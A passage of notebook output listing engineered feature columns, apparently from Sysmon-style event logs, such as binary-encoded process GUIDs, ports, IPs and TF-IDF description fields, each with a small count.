      "binary_SourceProcessGUID_13    3\n",
      "binary_SourceProcessGUID_14    3\n",
      "binary_SourceProcessGUID_15    3\n",
      "binary_TargetProcessGUID_0     3\n",
      "binary_TargetProcessGUID_1     3\n",
      "binary_TargetProcessGUID_2     3\n",
      "binary_TargetProcessGUID_3     3\n",
      "binary_TargetProcessGUID_4     3\n",
      "binary_TargetProcessGUID_5     3\n",
      "binary_TargetProcessGUID_6     3\n",
      "binary_TargetProcessGUID_7     3\n",
      "binary_TargetProcessGUID_8     3\n",
      "binary_TargetProcessGUID_9     3\n",
      "binary_TargetProcessGUID_10    3\n",
      "binary_TargetProcessGUID_11    3\n",
      "binary_TargetProcessGUID_12    3\n",
      "binary_TargetProcessGUID_13    3\n",
      "binary_TargetProcessGUID_14    3\n",
      "binary_TargetProcessGUID_15    3\n",
      "binary_SourceProcessGuid_0     3\n",
      "binary_SourceProcessGuid_1     3\n",
      "binary_SourceProcessGuid_2     3\n",
      "binary_SourceProcessGuid_3     3\n",
      "binary_SourceProcessGuid_4     3\n",
      "binary_SourceProcessGuid_5     3\n",
      "binary_SourceProcessGuid_6     3\n",
      "binary_SourceProcessGuid_7     3\n",
      "binary_SourceProcessGuid_8     3\n",
      "binary_SourceProcessGuid_9     3\n",
      "binary_SourceProcessGuid_10    3\n",
      "binary_SourceProcessGuid_11    3\n",
      "binary_SourceProcessGuid_12    3\n",
      "binary_SourceProcessGuid_13    3\n",
      "binary_SourceProcessGuid_14    3\n",
      "binary_SourceProcessGuid_15    3\n",
      "binary_LogonGuid_0             3\n",
      "binary_LogonGuid_1             3\n",
      "binary_LogonGuid_2             3\n",
      "binary_LogonGuid_3             3\n",
      "binary_LogonGuid_4             3\n",
      "binary_LogonGuid_5             3\n",
      "binary_LogonGuid_6             3\n",
      "binary_LogonGuid_7             3\n",
      "binary_LogonGuid_8             3\n",
      "binary_LogonGuid_9             3\n",
      "binary_LogonGuid_10            3\n",
      "binary_LogonGuid_11            3\n",
      "binary_LogonGuid_12            3\n",
      "binary_LogonGuid_13            3\n",
      "binary_LogonGuid_14            3\n",
      "binary_LogonGuid_15            3\n",
      "binary_ThreadID_0              3\n",
      "binary_ThreadID_1              3\n",
      "binary_ThreadID_2              3\n",
      "binary_ThreadID_3              3\n",
      "binary_ThreadID_4              3\n",
      "binary_ThreadID_5              3\n",
      "binary_ThreadID_6              3\n",
      "binary_ThreadID_7              3\n",
      "binary_ThreadID_8              3\n",
      "binary_ThreadID_9              3\n",
      "binary_ThreadID_10             3\n",
      "binary_ThreadID_11             3\n",
      "binary_ThreadID_12             3\n",
      "binary_ThreadID_13             3\n",
      "binary_ThreadID_14             3\n",
      "binary_ThreadID_15             3\n",
      "binary_LogonId_0               3\n",
      "binary_LogonId_1               3\n",
      "binary_LogonId_2               3\n",
      "binary_LogonId_3               3\n",
      "binary_LogonId_4               3\n",
      "binary_LogonId_5               3\n",
      "binary_LogonId_6               3\n",
      "binary_LogonId_7               3\n",
      "binary_LogonId_8               3\n",
      "binary_LogonId_9               3\n",
      "binary_LogonId_10              3\n",
      "binary_LogonId_11              3\n",
      "binary_LogonId_12              3\n",
      "binary_LogonId_13              3\n",
      "binary_LogonId_14              3\n",
      "binary_LogonId_15              3\n",
      "binary_SourceHostname_0        3\n",
      "binary_SourceHostname_1        3\n",
      "binary_SourceHostname_2        3\n",
      "binary_SourceHostname_3        3\n",
      "binary_SourceHostname_4        3\n",
      "binary_SourceHostname_5        3\n",
      "binary_SourceHostname_6        3\n",
      "binary_SourceHostname_7        3\n",
      "binary_SourceHostname_8        3\n",
      "binary_SourceHostname_9        3\n",
      "binary_SourceHostname_10       3\n",
      "binary_SourceHostname_11       3\n",
      "binary_SourceHostname_12       3\n",
      "binary_SourceHostname_13       3\n",
      "binary_SourceHostname_14       3\n",
      "binary_SourceHostname_15       3\n",
      "binary_OriginalFileName_0      3\n",
      "binary_OriginalFileName_1      3\n",
      "binary_OriginalFileName_2      3\n",
      "binary_OriginalFileName_3      3\n",
      "binary_OriginalFileName_4      3\n",
      "binary_OriginalFileName_5      3\n",
      "binary_OriginalFileName_6      3\n",
      "binary_OriginalFileName_7      3\n",
      "binary_OriginalFileName_8      3\n",
      "binary_OriginalFileName_9      3\n",
      "binary_OriginalFileName_10     3\n",
      "binary_OriginalFileName_11     3\n",
      "binary_OriginalFileName_12     3\n",
      "binary_OriginalFileName_13     3\n",
      "binary_OriginalFileName_14     3\n",
      "binary_OriginalFileName_15     3\n",
      "binary_TargetProcessGuid_0     3\n",
      "binary_TargetProcessGuid_1     3\n",
      "binary_TargetProcessGuid_2     3\n",
      "binary_TargetProcessGuid_3     3\n",
      "binary_TargetProcessGuid_4     3\n",
      "binary_TargetProcessGuid_5     3\n",
      "binary_TargetProcessGuid_6     3\n",
      "binary_TargetProcessGuid_7     3\n",
      "binary_TargetProcessGuid_8     3\n",
      "binary_TargetProcessGuid_9     3\n",
      "binary_TargetProcessGuid_10    3\n",
      "binary_TargetProcessGuid_11    3\n",
      "binary_TargetProcessGuid_12    3\n",
      "binary_TargetProcessGuid_13    3\n",
      "binary_TargetProcessGuid_14    3\n",
      "binary_TargetProcessGuid_15    3\n",
      "binary_DestinationHostname_0   3\n",
      "binary_DestinationHostname_1   3\n",
      "binary_DestinationHostname_2   3\n",
      "binary_DestinationHostname_3   3\n",
      "binary_DestinationHostname_4   3\n",
      "binary_DestinationHostname_5   3\n",
      "binary_DestinationHostname_6   3\n",
      "binary_DestinationHostname_7   3\n",
      "binary_DestinationHostname_8   3\n",
      "binary_DestinationHostname_9   3\n",
      "binary_DestinationHostname_10  3\n",
      "binary_DestinationHostname_11  3\n",
      "binary_DestinationHostname_12  3\n",
      "binary_DestinationHostname_13  3\n",
      "binary_DestinationHostname_14  3\n",
      "binary_DestinationHostname_15  3\n",
      "binary_SourcePortName_0        3\n",
      "binary_SourcePortName_1        3\n",
      "binary_SourcePortName_2        3\n",
      "binary_SourcePortName_3        3\n",
      "binary_SourcePortName_4        3\n",
      "binary_SourcePortName_5        3\n",
      "binary_SourcePortName_6        3\n",
      "binary_SourcePortName_7        3\n",
      "binary_SourcePortName_8        3\n",
      "binary_SourcePortName_9        3\n",
      "binary_SourcePortName_10       3\n",
      "binary_SourcePortName_11       3\n",
      "binary_SourcePortName_12       3\n",
      "binary_SourcePortName_13       3\n",
      "binary_SourcePortName_14       3\n",
      "binary_SourcePortName_15       3\n",
      "binary_DestinationPortName_0   3\n",
      "binary_DestinationPortName_1   3\n",
      "binary_DestinationPortName_2   3\n",
      "binary_DestinationPortName_3   3\n",
      "binary_DestinationPortName_4   3\n",
      "binary_DestinationPortName_5   3\n",
      "binary_DestinationPortName_6   3\n",
      "binary_DestinationPortName_7   3\n",
      "binary_DestinationPortName_8   3\n",
      "binary_DestinationPortName_9   3\n",
      "binary_DestinationPortName_10  3\n",
      "binary_DestinationPortName_11  3\n",
      "binary_DestinationPortName_12  3\n",
      "binary_DestinationPortName_13  3\n",
      "binary_DestinationPortName_14  3\n",
      "binary_DestinationPortName_15  3\n",
      "binary_StartAddress_0          3\n",
      "binary_StartAddress_1          3\n",
      "binary_StartAddress_2          3\n",
      "binary_StartAddress_3          3\n",
      "binary_StartAddress_4          3\n",
      "binary_StartAddress_5          3\n",
      "binary_StartAddress_6          3\n",
      "binary_StartAddress_7          3\n",
      "binary_StartAddress_8          3\n",
      "binary_StartAddress_9          3\n",
      "binary_StartAddress_10         3\n",
      "binary_StartAddress_11         3\n",
      "binary_StartAddress_12         3\n",
      "binary_StartAddress_13         3\n",
      "binary_StartAddress_14         3\n",
      "binary_StartAddress_15         3\n",
      "binary_StartModule_0           3\n",
      "binary_StartModule_1           3\n",
      "binary_StartModule_2           3\n",
      "binary_StartModule_3           3\n",
      "binary_StartModule_4           3\n",
      "binary_StartModule_5           3\n",
      "binary_StartModule_6           3\n",
      "binary_StartModule_7           3\n",
      "binary_StartModule_8           3\n",
      "binary_StartModule_9           3\n",
      "binary_StartModule_10          3\n",
      "binary_StartModule_11          3\n",
      "binary_StartModule_12          3\n",
      "binary_StartModule_13          3\n",
      "binary_StartModule_14          2\n",
      "binary_StartModule_15          3\n",
      "binary_NewThreadId_0           3\n",
      "binary_NewThreadId_1           3\n",
      "binary_NewThreadId_2           3\n",
      "binary_NewThreadId_3           3\n",
      "binary_NewThreadId_4           3\n",
      "binary_NewThreadId_5           3\n",
      "binary_NewThreadId_6           3\n",
      "binary_NewThreadId_7           3\n",
      "binary_NewThreadId_8           3\n",
      "binary_NewThreadId_9           3\n",
      "binary_NewThreadId_10          3\n",
      "binary_NewThreadId_11          3\n",
      "binary_NewThreadId_12          3\n",
      "binary_NewThreadId_13          3\n",
      "binary_NewThreadId_14          3\n",
      "binary_NewThreadId_15          3\n",
      "binary_GrantedAccess_0         3\n",
      "binary_GrantedAccess_1         3\n",
      "binary_GrantedAccess_2         3\n",
      "binary_GrantedAccess_3         3\n",
      "binary_GrantedAccess_4         3\n",
      "binary_GrantedAccess_5         3\n",
      "binary_GrantedAccess_6         3\n",
      "binary_GrantedAccess_7         3\n",
      "binary_GrantedAccess_8         3\n",
      "binary_GrantedAccess_9         3\n",
      "binary_GrantedAccess_10        3\n",
      "binary_GrantedAccess_11        3\n",
      "binary_GrantedAccess_12        3\n",
      "binary_GrantedAccess_13        3\n",
      "binary_GrantedAccess_14        3\n",
      "binary_GrantedAccess_15        3\n",
      "binary_QueryName_0             3\n",
      "binary_QueryName_1             3\n",
      "binary_QueryName_2             3\n",
      "binary_QueryName_3             3\n",
      "binary_QueryName_4             3\n",
      "binary_QueryName_5             3\n",
      "binary_QueryName_6             3\n",
      "binary_QueryName_7             3\n",
      "binary_QueryName_8             3\n",
      "binary_QueryName_9             3\n",
      "binary_QueryName_10            3\n",
      "binary_QueryName_11            3\n",
      "binary_QueryName_12            3\n",
      "binary_QueryName_13            3\n",
      "binary_QueryName_14            3\n",
      "binary_QueryName_15            3\n",
      "binary_QueryResults_0          3\n",
      "binary_QueryResults_1          3\n",
      "binary_QueryResults_2          3\n",
      "binary_QueryResults_3          3\n",
      "binary_QueryResults_4          3\n",
      "binary_QueryResults_5          3\n",
      "binary_QueryResults_6          3\n",
      "binary_QueryResults_7          3\n",
      "binary_QueryResults_8          3\n",
      "binary_QueryResults_9          3\n",
      "binary_QueryResults_10         3\n",
      "binary_QueryResults_11         3\n",
      "binary_QueryResults_12         3\n",
      "binary_QueryResults_13         3\n",
      "binary_QueryResults_14         3\n",
      "binary_QueryResults_15         3\n",
      "binary_Hashes_0                3\n",
      "binary_Hashes_1                3\n",
      "binary_Hashes_2                3\n",
      "binary_Hashes_3                3\n",
      "binary_Hashes_4                3\n",
      "binary_Hashes_5                3\n",
      "binary_Hashes_6                3\n",
      "binary_Hashes_7                3\n",
      "binary_Hashes_8                3\n",
      "binary_Hashes_9                3\n",
      "binary_Hashes_10               3\n",
      "binary_Hashes_11               3\n",
      "binary_Hashes_12               3\n",
      "binary_Hashes_13               3\n",
      "binary_Hashes_14               3\n",
      "binary_Hashes_15               3\n",
      "binary_Hash_0                  3\n",
      "binary_Hash_1                  3\n",
      "binary_Hash_2                  3\n",
      "binary_Hash_3                  3\n",
      "binary_Hash_4                  3\n",
      "binary_Hash_5                  3\n",
      "binary_Hash_6                  3\n",
      "binary_Hash_7                  3\n",
      "binary_Hash_8                  3\n",
      "binary_Hash_9                  3\n",
      "binary_Hash_10                 3\n",
      "binary_Hash_11                 3\n",
      "binary_Hash_12                 3\n",
      "binary_Hash_13                 3\n",
      "binary_Hash_14                 3\n",
      "binary_Hash_15                 3\n",
      "binary_Contents_0              3\n",
      "binary_Contents_1              3\n",
      "binary_Contents_2              3\n",
      "binary_Contents_3              3\n",
      "binary_Contents_4              3\n",
      "binary_Contents_5              3\n",
      "binary_Contents_6              3\n",
      "binary_Contents_7              3\n",
      "binary_Contents_8              3\n",
      "binary_Contents_9              3\n",
      "binary_Contents_10             3\n",
      "binary_Contents_11             3\n",
      "binary_Contents_12             3\n",
      "binary_Contents_13             3\n",
      "binary_Contents_14             3\n",
      "binary_Contents_15             3\n",
      "SourceIp_binary_0              2\n",
      "SourceIp_binary_1              2\n",
      "SourceIp_binary_2              2\n",
      "SourceIp_binary_3              2\n",
      "SourceIp_binary_4              2\n",
      "SourceIp_binary_5              2\n",
      "SourceIp_binary_6              2\n",
      "SourceIp_binary_7              2\n",
      "SourceIp_binary_8              2\n",
      "SourceIp_binary_9              2\n",
      "SourceIp_binary_10             2\n",
      "SourceIp_binary_11             2\n",
      "SourceIp_binary_12             2\n",
      "SourceIp_binary_13             2\n",
      "SourceIp_binary_14             2\n",
      "SourceIp_binary_15             2\n",
      "SourceIp_prefix_binary_0       2\n",
      "SourceIp_prefix_binary_1       2\n",
      "SourceIp_prefix_binary_2       2\n",
      "SourceIp_prefix_binary_3       2\n",
      "SourceIp_prefix_binary_4       2\n",
      "SourceIp_prefix_binary_5       2\n",
      "SourceIp_prefix_binary_6       2\n",
      "SourceIp_prefix_binary_7       2\n",
      "SourceIp_prefix_binary_8       2\n",
      "SourceIp_prefix_binary_9       2\n",
      "SourceIp_prefix_binary_10      2\n",
      "SourceIp_prefix_binary_11      2\n",
      "SourceIp_prefix_binary_12      2\n",
      "SourceIp_prefix_binary_13      2\n",
      "SourceIp_prefix_binary_14      2\n",
      "SourceIp_prefix_binary_15      2\n",
      "DestinationIp_binary_0         2\n",
      "DestinationIp_binary_1         2\n",
      "DestinationIp_binary_2         2\n",
      "DestinationIp_binary_3         2\n",
      "DestinationIp_binary_4         2\n",
      "DestinationIp_binary_5         2\n",
      "DestinationIp_binary_6         2\n",
      "DestinationIp_binary_7         2\n",
      "DestinationIp_binary_8         2\n",
      "DestinationIp_binary_9         2\n",
      "DestinationIp_binary_10        2\n",
      "DestinationIp_binary_11        2\n",
      "DestinationIp_binary_12        2\n",
      "DestinationIp_binary_13        2\n",
      "DestinationIp_binary_14        2\n",
      "DestinationIp_binary_15        2\n",
      "DestinationIp_prefix_binary_0  2\n",
      "DestinationIp_prefix_binary_1  2\n",
      "DestinationIp_prefix_binary_2  2\n",
      "DestinationIp_prefix_binary_3  2\n",
      "DestinationIp_prefix_binary_4  2\n",
      "DestinationIp_prefix_binary_5  2\n",
      "DestinationIp_prefix_binary_6  2\n",
      "DestinationIp_prefix_binary_7  2\n",
      "DestinationIp_prefix_binary_8  2\n",
      "DestinationIp_prefix_binary_9  2\n",
      "DestinationIp_prefix_binary_10 2\n",
      "DestinationIp_prefix_binary_11 2\n",
      "DestinationIp_prefix_binary_12 2\n",
      "DestinationIp_prefix_binary_13 2\n",
      "DestinationIp_prefix_binary_14 2\n",
      "DestinationIp_prefix_binary_15 2\n",
      "FileVersion_Part_0_normalized  43\n",
      "FileVersion_Part_1_normalized  64\n",
      "FileVersion_Part_2_normalized  116\n",
      "FileVersion_Part_3_normalized  158\n",
      "Description_tfidf_0            6\n",
      "Description_tfidf_1            5\n",
      "Description_tfidf_2            6\n",
      "Description_tfidf_3            6\n",
      "Description_tfidf_4            8\n",
      "Description_tfidf_5            5\n",
      "Description_tfidf_6            8\n",
      "Description_tfidf_7            10\n",
      "Description_tfidf_8            14\n",
      "Description_tfidf_9            10\n",
      "Description_tfidf_10           7\n",
      "Description_tfidf_11           12\n",
      "Description_tfidf_12           7\n",
      "Description_tfidf_13           10\n",
      "Description_tfidf_14           10\n",
      "Description_tfidf_15           15\n",
      "Description_tfidf_16           16\n",
      "Description_tfidf_17           24\n",
      "Description_tfidf_18           7\n",
      "Description_tfidf_19           8\n",
      "Description_tfidf_20           12\n",
      "Description_tfidf_21           16\n",
      "Description_tfidf_22           7\n",
      "Description_tfidf_23           10\n",
      "Description_tfidf_24           8\n",
      "Description_tfidf_25           7\n",
      "Description_tfidf_26           7\n",
      "Description_tfidf_27           10\n",
      "Description_tfidf_28           8\n",
      "Description_tfidf_29           9\n",
      "Description_tfidf_30           6\n",
      "Description_tfidf_31           8\n",
      "Description_tfidf_32           8\n",
      "Description_tfidf_33           7\n",
      "Description_tfidf_34           8\n",
      "Description_tfidf_35           12\n",
      "Description_tfidf_36           12\n",
      "Description_tfidf_37           7\n",
      "Description_tfidf_38           9\n",
      "Description_tfidf_39           12\n",
      "Description_tfidf_40           7\n",
      "Description_tfidf_41           7\n",
      "Description_tfidf_42           8\n",
      "Description_tfidf_43           22\n",
      "Description_tfidf_44           8\n",
      "Description_tfidf_45           16\n",
      "Description_tfidf_46           13\n",
      "Description_tfidf_47           11\n",
      "Description_tfidf_48           8\n",
      "Description_tfidf_49           14\n",
      "Description_tfidf_50           7\n",
      "Description_tfidf_51           8\n",
      "Description_tfidf_52           7\n",
      "Description_tfidf_53           9\n",
      "Description_tfidf_54           7\n",
      "Description_tfidf_55           10\n",
      "Description_tfidf_56           10\n",
      "Description_tfidf_57           8\n",
      "Description_tfidf_58           8\n",
      "Description_tfidf_59           8\n",
      "Description_tfidf_60           9\n",
      "Description_tfidf_61           7\n",
      "Description_tfidf_62           7\n",
      "Description_tfidf_63           16\n",
      "Description_tfidf_64           7\n",
      "Description_tfidf_65           7\n",
      "Description_tfidf_66           7\n",
      "Description_tfidf_67           8\n",
      "Description_tfidf_68           8\n",
      "Description_tfidf_69           6\n",
      "Description_tfidf_70           7\n",
      "Description_tfidf_71           20\n",
      "Description_tfidf_72           11\n",
      "Description_tfidf_73           9\n",
      "Description_tfidf_74           6\n",
      "Description_tfidf_75           8\n",
      "Description_tfidf_76           10\n",
      "Description_tfidf_77           6\n",
      "Description_tfidf_78           6\n",
      "Description_tfidf_79           38\n",
      "Description_tfidf_80           6\n",
      "Description_tfidf_81           7\n",
      "Description_tfidf_82           10\n",
      "Description_tfidf_83           6\n",
      "Description_tfidf_84           7\n",
      "Description_tfidf_85           9\n",
      "Description_tfidf_86           14\n",
      "Description_tfidf_87           6\n",
      "Description_tfidf_88           8\n",
      "Description_tfidf_89           8\n",
      "Description_tfidf_90           10\n",
      "Description_tfidf_91           10\n",
      "Description_tfidf_92           7\n",
      "Description_tfidf_93           12\n",
      "Description_tfidf_94           7\n",
      "Description_tfidf_95           9\n",
      "Description_tfidf_96           20\n",
      "Description_tfidf_97           7\n",
      "Description_tfidf_98           25\n",
      "Description_tfidf_99           8\n",
      "Description_tfidf_100          10\n",
      "Description_tfidf_101          9\n",
      "Description_tfidf_102          8\n",
      "Description_tfidf_103          7\n",
      "Description_tfidf_104          8\n",
      "Description_tfidf_105          7\n",
      "Description_tfidf_106          10\n",
      "Description_tfidf_107          9\n",
      "Description_tfidf_108          9\n",
      "Description_tfidf_109          14\n",
      "Description_tfidf_110          8\n",
      "Description_tfidf_111          31\n",
      "Description_tfidf_112          24\n",
      "Description_tfidf_113          7\n",
      "Description_tfidf_114          7\n",
      "Description_tfidf_115          9\n",
      "Description_tfidf_116          7\n",
      "Description_tfidf_117          8\n",
      "Description_tfidf_118          7\n",
      "Description_tfidf_119          7\n",
      "Description_tfidf_120          8\n",
      "Description_tfidf_121          12\n",
      "Description_tfidf_122          12\n",
      "Description_tfidf_123          10\n",
      "Description_tfidf_124          14\n",
      "Description_tfidf_125          8\n",
      "Description_tfidf_126          9\n",
      "Description_tfidf_127          8\n",
      "Description_tfidf_128          9\n",
      "Description_tfidf_129          7\n",
      "Description_tfidf_130          10\n",
      "Description_tfidf_131          10\n",
      "Description_tfidf_132          16\n",
      "Description_tfidf_133          7\n",
      "Description_tfidf_134          8\n",
      "Description_tfidf_135          10\n",
      "Description_tfidf_136          10\n",
      "Description_tfidf_137          8\n",
      "Description_tfidf_138          11\n",
      "Description_tfidf_139          9\n",
      "Description_tfidf_140          9\n",
      "Description_tfidf_141          11\n",
      "Description_tfidf_142          23\n",
      "Description_tfidf_143          18\n",
      "Description_tfidf_144          7\n",
      "Description_tfidf_145          9\n",
      "Description_tfidf_146          47\n",
      "Description_tfidf_147          13\n",
      "Description_tfidf_148          17\n",
      "Description_tfidf_149          9\n",
      "Description_tfidf_150          49\n",
      "Description_tfidf_151          14\n",
      "Description_tfidf_152          8\n",
      "Description_tfidf_153          9\n",
      "Description_tfidf_154          6\n",
      "Description_tfidf_155          7\n",
      "Description_tfidf_156          7\n",
      "Description_tfidf_157          12\n",
      "Description_tfidf_158          6\n",
      "Description_tfidf_159          6\n",
      "Description_tfidf_160          7\n",
      "Description_tfidf_161          9\n",
      "Description_tfidf_162          10\n",
      "Description_tfidf_163          9\n",
      "Description_tfidf_164          7\n",
      "Description_tfidf_165          7\n",
      "Description_tfidf_166          10\n",
      "Description_tfidf_167          15\n",
      "Description_tfidf_168          10\n",
      "Description_tfidf_169          6\n",
      "Description_tfidf_170          7\n",
      "Description_tfidf_171          9\n",
      "Description_tfidf_172          9\n",
      "Description_tfidf_173          8\n",
      "Description_tfidf_174          8\n",
      "Description_tfidf_175          7\n",
      "Description_tfidf_176          11\n",
      "Description_tfidf_177          7\n",
      "Description_tfidf_178          7\n",
      "Description_tfidf_179          10\n",
      "Description_tfidf_180          8\n",
      "Description_tfidf_181          9\n",
      "Description_tfidf_182          7\n",
      "Description_tfidf_183          9\n",
      "Description_tfidf_184          9\n",
      "Description_tfidf_185          7\n",
      "Description_tfidf_186          7\n",
      "Description_tfidf_187          7\n",
      "Description_tfidf_188          11\n",
      "Description_tfidf_189          19\n",
      "Description_tfidf_190          9\n",
      "Description_tfidf_191          7\n",
      "Description_tfidf_192          7\n",
      "Description_tfidf_193          9\n",
      "Description_tfidf_194          38\n",
      "Description_tfidf_195          12\n",
      "Description_tfidf_196          11\n",
      "Description_tfidf_197          7\n",
      "Product_tfidf_0                7\n",
      "Product_tfidf_1                7\n",
      "Product_tfidf_2                7\n",
      "Product_tfidf_3                6\n",
      "Product_tfidf_4                7\n",
      "Product_tfidf_5                8\n",
      "Product_tfidf_6                10\n",
      "Product_tfidf_7                7\n",
      "Product_tfidf_8                7\n",
      "Product_tfidf_9                7\n",
      "Product_tfidf_10               10\n",
      "Product_tfidf_11               9\n",
      "Product_tfidf_12               8\n",
      "Product_tfidf_13               6\n",
      "Product_tfidf_14               7\n",
      "Product_tfidf_15               6\n",
      "Product_tfidf_16               7\n",
      "Product_tfidf_17               9\n",
      "Product_tfidf_18               7\n",
      "Product_tfidf_19               8\n",
      "Product_tfidf_20               8\n",
      "Product_tfidf_21               19\n",
      "Product_tfidf_22               22\n",
      "Product_tfidf_23               10\n",
      "Product_tfidf_24               7\n",
      "Product_tfidf_25               10\n",
      "Product_tfidf_26               8\n",
      "Product_tfidf_27               10\n",
      "Company_tfidf_0                7\n",
      "Company_tfidf_1                6\n",
      "Company_tfidf_2                7\n",
      "Company_tfidf_3                7\n",
      "Company_tfidf_4                6\n",
      "Company_tfidf_5                7\n",
      "Company_tfidf_6                7\n",
      "Company_tfidf_7                8\n",
      "Company_tfidf_8                8\n",
      "Company_tfidf_9                8\n",
      "Company_tfidf_10               9\n",
      "Company_tfidf_11               7\n",
      "EventID_binary_0               3\n",
      "EventID_binary_1               3\n",
      "EventID_binary_2               3\n",
      "EventID_binary_3               3\n",
      "EventID_binary_4               3\n",
      "EventID_binary_5               3\n",
      "EventID_binary_6               3\n",
      "EventID_binary_7               3\n",
      "EventID_binary_8               3\n",
      "EventID_binary_9               3\n",
      "EventID_binary_10              3\n",
      "EventID_binary_11              3\n",
      "EventID_binary_12              3\n",
      "EventID_binary_13              3\n",
      "EventID_binary_14              3\n",
      "EventID_binary_15              3\n",
      "ProcessID_binary_0             3\n",
      "ProcessID_binary_1             3\n",
      "ProcessID_binary_2             3\n",
      "ProcessID_binary_3             3\n",
      "ProcessID_binary_4             3\n",
      "ProcessID_binary_5             3\n",
      "ProcessID_binary_6             3\n",
      "ProcessID_binary_7             3\n",
      "ProcessID_binary_8             3\n",
      "ProcessID_binary_9             3\n",
      "ProcessID_binary_10            3\n",
      "ProcessID_binary_11            3\n",
      "ProcessID_binary_12            3\n",
      "ProcessID_binary_13            3\n",
      "ProcessID_binary_14            3\n",
      "ProcessID_binary_15            3\n",
      "Execution_ProcessID_binary_0   3\n",
      "Execution_ProcessID_binary_1   3\n",
      "Execution_ProcessID_binary_2   3\n",
      "Execution_ProcessID_binary_3   3\n",
      "Execution_ProcessID_binary_4   3\n",
      "Execution_ProcessID_binary_5   3\n",
      "Execution_ProcessID_binary_6   3\n",
      "Execution_ProcessID_binary_7   3\n",
      "Execution_ProcessID_binary_8   3\n",
      "Execution_ProcessID_binary_9   3\n",
      "Execution_ProcessID_binary_10  3\n",
      "Execution_ProcessID_binary_11  3\n",
      "Execution_ProcessID_binary_12  3\n",
      "Execution_ProcessID_binary_13  3\n",
      "Execution_ProcessID_binary_14  3\n",
      "Execution_ProcessID_binary_15  3\n",
      "ParentProcessId_binary_0       3\n",
      "ParentProcessId_binary_1       3\n",
      "ParentProcessId_binary_2       3\n",
      "ParentProcessId_binary_3       3\n",
      "ParentProcessId_binary_4       3\n",
      "ParentProcessId_binary_5       3\n",
      "ParentProcessId_binary_6       3\n",
      "ParentProcessId_binary_7       3\n",
      "ParentProcessId_binary_8       3\n",
      "ParentProcessId_binary_9       3\n",
      "ParentProcessId_binary_10      3\n",
      "ParentProcessId_binary_11      3\n",
      "ParentProcessId_binary_12      3\n",
      "ParentProcessId_binary_13      3\n",
      "ParentProcessId_binary_14      3\n",
      "ParentProcessId_binary_15      3\n",
      "TargetProcessId_binary_0       3\n",
      "TargetProcessId_binary_1       3\n",
      "TargetProcessId_binary_2       3\n",
      "TargetProcessId_binary_3       3\n",
      "TargetProcessId_binary_4       3\n",
      "TargetProcessId_binary_5       3\n",
      "TargetProcessId_binary_6       3\n",
      "TargetProcessId_binary_7       3\n",
      "TargetProcessId_binary_8       3\n",
      "TargetProcessId_binary_9       3\n",
      "TargetProcessId_binary_10      3\n",
      "TargetProcessId_binary_11      3\n",
      "TargetProcessId_binary_12      3\n",
      "TargetProcessId_binary_13      3\n",
      "TargetProcessId_binary_14      3\n",
      "TargetProcessId_binary_15      3\n",
      "EventRecordID_binary_0         3\n",
      "EventRecordID_binary_1         3\n",
      "EventRecordID_binary_2         3\n",
      "EventRecordID_binary_3         3\n",
      "EventRecordID_binary_4         3\n",
      "EventRecordID_binary_5         3\n",
      "EventRecordID_binary_6         3\n",
      "EventRecordID_binary_7         3\n",
      "EventRecordID_binary_8         3\n",
      "EventRecordID_binary_9         3\n",
      "EventRecordID_binary_10        3\n",
      "EventRecordID_binary_11        3\n",
      "EventRecordID_binary_12        3\n",
      "EventRecordID_binary_13        3\n",
      "EventRecordID_binary_14        3\n",
      "EventRecordID_binary_15        3\n",
      "SourcePort_binary_0            3\n",
      "SourcePort_binary_1            3\n",
      "SourcePort_binary_2            3\n",
      "SourcePort_binary_3            3\n",
      "SourcePort_binary_4            3\n",
      "SourcePort_binary_5            3\n",
      "SourcePort_binary_6            3\n",
      "SourcePort_binary_7            3\n",
      "SourcePort_binary_8            3\n",
      "SourcePort_binary_9            3\n",
      "SourcePort_binary_10           3\n",
      "SourcePort_binary_11           3\n",
      "SourcePort_binary_12           3\n",
      "SourcePort_binary_13           3\n",
      "SourcePort_binary_14           3\n",
      "SourcePort_binary_15           3\n",
      "DestinationPort_binary_0       3\n",
      "DestinationPort_binary_1       3\n",
      "DestinationPort_binary_2       3\n",
      "DestinationPort_binary_3       3\n",
      "DestinationPort_binary_4       3\n",
      "DestinationPort_binary_5       3\n",
      "DestinationPort_binary_6       3\n",
      "DestinationPort_binary_7       3\n",
      "DestinationPort_binary_8       3\n",
      "DestinationPort_binary_9       3\n",
      "DestinationPort_binary_10      3\n",
      "DestinationPort_binary_11      3\n",
      "DestinationPort_binary_12      3\n",
      "DestinationPort_binary_13      3\n",
      "DestinationPort_binary_14      3\n",
      "DestinationPort_binary_15      3\n",
      "ProcessId_binary_0             3\n",
      "ProcessId_binary_1             3\n",
      "ProcessId_binary_2             3\n",
      "ProcessId_binary_3             3\n",
      "ProcessId_binary_4             3\n",
      "ProcessId_binary_5             3\n",
      "ProcessId_binary_6             3\n",
      "ProcessId_binary_7             3\n",
      "ProcessId_binary_8             3\n",
      "ProcessId_binary_9             3\n",
      "ProcessId_binary_10            3\n",
      "ProcessId_binary_11            3\n",
      "ProcessId_binary_12            3\n",
      "ProcessId_binary_13            3\n",
      "ProcessId_binary_14            3\n",
      "ProcessId_binary_15            3\n",
      "Description_tfidf_198          12\n",
      "Description_tfidf_199          6\n",
      "Description_tfidf_200          7\n",
      "Description_tfidf_201          6\n",
      "Description_tfidf_202          6\n",
      "Description_tfidf_203          6\n",
      "Description_tfidf_204          6\n",
      "Description_tfidf_205          6\n",
      "Description_tfidf_206          7\n",
      "Description_tfidf_207          8\n",
      "Description_tfidf_208          7\n",
      "Description_tfidf_209          6\n",
      "Description_tfidf_210          10\n",
      "Description_tfidf_211          6\n",
      "Description_tfidf_212          6\n",
      "Description_tfidf_213          6\n",
      "Description_tfidf_214          6\n",
      "Description_tfidf_215          6\n",
      "Description_tfidf_216          11\n",
      "Description_tfidf_217          6\n",
      "Description_tfidf_218          14\n",
      "Description_tfidf_219          8\n",
      "Description_tfidf_220          8\n",
      "Description_tfidf_221          17\n",
      "Description_tfidf_222          27\n",
      "Description_tfidf_223          23\n",
      "Description_tfidf_224          8\n",
      "Description_tfidf_225          7\n",
      "Description_tfidf_226          8\n",
      "Description_tfidf_227          10\n",
      "Description_tfidf_228          10\n",
      "Description_tfidf_229          6\n",
      "Description_tfidf_230          6\n",
      "Description_tfidf_231          7\n",
      "Description_tfidf_232          6\n",
      "Description_tfidf_233          6\n",
      "Description_tfidf_234          9\n",
      "Description_tfidf_235          6\n",
      "Description_tfidf_236          6\n",
      "Description_tfidf_237          6\n",
      "Description_tfidf_238          6\n",
      "Description_tfidf_239          8\n",
      "Description_tfidf_240          6\n",
